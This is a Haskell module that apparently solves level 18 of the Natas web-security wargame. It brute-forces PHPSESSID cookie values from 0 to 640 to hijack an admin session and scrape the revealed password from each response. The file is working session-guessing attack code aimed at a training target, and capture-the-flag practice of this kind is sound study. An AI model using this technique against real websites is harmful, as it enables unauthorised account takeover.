{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas18 where

import           Data.Text          (Text, pack)
import           Data.Text.Encoding (encodeUtf8)
import           Safe               (headMay, lastMay)

import           Network.Wreq       (Options, Part, cookie, cookieValue,
                                     cookies, partText, responseCookieJar)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  req <- postLevel 18 defaultForm
  let placeJar = cookies ?~ (req ^. responseCookieJar)
  firstMaybeM (attemptConnect placeJar) [0 .. 640]

defaultForm :: [Part]
defaultForm = [partText "username" "admin", partText "password" "password"]

attemptConnect :: (Options -> Options) -> Int -> IO (Maybe Text)
attemptConnect placeJar value = do
  let packedValue = (encodeUtf8 . pack . show) value
      modifyCookie = (cookie "PHPSESSID" . cookieValue) .~ packedValue
  ckireq <- postLevel' 18 (parentUri 18) (modifyCookie . placeJar) defaultForm
  let body = reqBody ckireq
      match = headMay (workupBody' extractPassword body)
  print value
  pure $ match >>= lastMay

extractPassword :: [[Text]] -> [[Text]]
extractPassword = filter (pack "Username:" `elem`)
